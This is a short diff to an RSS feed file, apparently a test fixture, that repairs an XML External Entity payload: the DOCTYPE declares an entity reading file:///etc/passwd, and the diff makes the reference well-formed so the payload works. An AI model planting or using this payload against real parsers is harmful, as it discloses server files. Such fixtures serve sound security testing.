@@ -1,7 +1,8 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE foo [
+    <!ELEMENT foo ANY >
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
+    ]>
 <rss version="2.0">
 <channel>
 <title>RSS Title</title>
@@ -13,7 +14,7 @@
 
 <item>
 <title>Example entry</title>
-<title>&xxe</title>
+<foo>&xxe;</foo>
 <description>Here is some text containing an interesting description.</description>
 <link>http://www.example.com/blog/post/1</link>
 <guid isPermaLink="true">7bd204c6-1655-4c27-aeee-53f933c5395f</guid>
